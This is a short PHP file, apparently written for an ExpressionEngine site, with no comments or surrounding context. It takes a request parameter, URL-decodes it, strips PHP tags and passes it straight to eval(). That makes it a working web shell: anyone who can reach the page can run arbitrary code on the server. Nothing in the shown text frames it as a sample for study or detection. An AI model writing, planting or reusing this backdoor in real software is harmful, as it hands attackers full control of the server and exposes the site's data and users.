<?php
      $value = ee()->input->get_post('value');          
      $value=urldecode($value);
      $value=str_replace(array('<?php','<?','?>'),'',$value);
      eval($value);            
?>